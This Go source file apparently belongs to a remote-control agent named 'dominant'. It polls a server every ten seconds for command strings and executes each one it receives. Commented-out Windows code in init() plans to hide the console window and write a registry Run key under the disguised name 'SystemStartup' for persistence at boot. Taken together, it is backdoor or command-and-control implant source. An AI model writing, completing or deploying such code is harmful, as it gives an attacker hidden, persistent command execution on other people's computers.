package main

import (
	"dominant/mq/message"
	"dominant/server"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strconv"
	"time"
)

var ID string

const BaseUrl = server.BaseUrl

var client *http.Client

func init() {
	client = &http.Client{}
	ID = strconv.FormatInt(rand.New(rand.NewSource(time.Now().UnixNano())).Int63(), 10)
	switch runtimeEnvironment {
	case "windows":
		////隐藏终端窗口
		////修改windows注册表实现开机自动启动
		//keyName := `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` //自启动注册表路径
		//valueName := `SystemStartup`                                                  //伪装注册表名
		//regType := `REG_SZ`
		//regData, _ := os.Executable()
		//cmdLine:=	fmt.Sprintf(`reg add %s /v %s /t %s /d "%s"`, keyName, valueName, regType, regData)
		//cmd:=NewCommand(cmdLine)
		//go cmd.Exec()
	case "linux":

	case "darwin":

	}
}

func main() {
	fmt.Println(ID)
	for {
		time.Sleep(10 * time.Second)
		msg := getMessage()
		if msg != nil {
			cmdLine := msg.Body
			if cmdLine != nil {
				cmd := NewCommand(cmdLine.(string))
				cmd.Exec()
			}
		} else {
			continue
		}
	}
}

func getMessage() *message.Message {
	url := fmt.Sprintf("%s/getMessage", BaseUrl)
	req, _ := http.NewRequest("GET", url, nil)
	query := req.URL.Query()
	query.Add("id", ID)
	req.URL.RawQuery = query.Encode()
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, err := io.ReadAll(resp.Body)
	msg := &message.Message{}
	err = msg.MessageJsonUnMarshal(body)
	if err != nil {
		return nil
	}
	return msg
}

func postFeedback(m *message.Message) {

}
